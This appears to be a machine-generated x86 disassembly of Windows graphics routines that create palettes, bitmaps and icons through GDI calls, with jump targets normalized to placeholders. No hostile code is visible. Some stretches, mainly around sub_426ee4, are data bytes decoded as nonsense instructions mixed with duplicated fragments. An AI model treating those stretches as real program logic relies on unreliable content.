push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_425f1c
mov eax esp
call sub_42608c
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4261c8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_425f1c
mov [ esp ] eax
sub_42621c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425bc4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_425ba4
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4263c8
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425a34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4262ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_425a44
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262f5
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_425938
sub_4262f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425bc4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425a34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4263a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_425a44
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263af
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_4263e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_426474
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e80
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_42676b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_42655d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_425938
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426564
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426564
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_4263d8
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407e80
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_42674b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_42621c
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407e80
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_426728
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42672f
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_40270c
retn
call sub_42598c
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_4263d8
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_4263e4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_42677c
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_425920
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cc4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425bc4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_426860
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_42677c
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_4268cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_42677c
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426969
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426970
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4269a0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402cc4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402cc4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_426994
xor edx edx
push ebp
push sub_426b8e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_426860
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_426860
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426b67
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407e80
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407e80
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407e80
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e80
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_4268cc
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_4268cc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b6e
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40270c
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_40270c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_40270c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40270c
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_426b6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b95
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_426b9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_426bec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_426c44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_426bec
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426c8d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031f8
mov edi eax
mov eax esi
call sub_4031f8
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426dc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426daa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407fac
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426db1
mov al 0x1
sub_426de0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b380
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426e28
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e2f
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_426e34
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426e68
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b380
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426eb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426eba
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_426ee4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
outsd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x42 ] al
add [ eax + eax ] ah
add [ ecx + esi ] bl
inc edx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al ah
jo r-xdata
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ edi + ecx * 4 + 0x57a40041 ] ch
inc edx
add [ eax - 0x53ffbda9 ] dl
jno r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425540
retn
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418d74
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42701a
push [ fs : eax ]
dec eax
add al ch
call 0xffffffff8a426eaa
inc ebp
clc
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427021
mov eax [ rw-data ]
call sub_418dd8
retn
mov [ ebp - 0x4 ] eax
rcl [ ebp + 0x68 ] 0x1a
popad
outsb
jbe r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_426ff2
push [ fs : eax ]
xor eax eax
pop edx
xor [ ecx ] al
add [ eax ] al
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
add [ edi + edi * 8 + 0x30 ] ah
call sub_4189b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4254e4
test al al
je r-xdata
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
pop esi
retn
rcr [ eax + 0x6f ] 0x42
add [ edi ] al
or eax 0x74694254
insd
popad
jo r-xdata
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
popad
outsb
jbe r-xdata
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_42710c
rcl [ ebp + 0x68 ] 0xf2
outsd
inc edx
add [ edi + edi * 8 + 0x30 ] ah
jae r-xdata
jo r-xdata
outsd
inc edx
add [ eax + 0x4004231 ] cl
add [ eax ] cl
inc edi
jb r-xdata
hlt
jo r-xdata
sub_426f7c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418d74
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42701a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427021
mov eax [ rw-data ]
call sub_418dd8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_426ff2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_42710c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425540
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4189b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4254e4
test al al
je r-xdata
sub_427028
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418d74
mov esi eax
xor ecx ecx
push ebp
push sub_427098
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
mov edx ebx
mov eax esi
call sub_4189b0
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_42710c
sub_4270a4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424d10
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4270e0
push ebx
push esi
call sub_403664
mov ebx edx
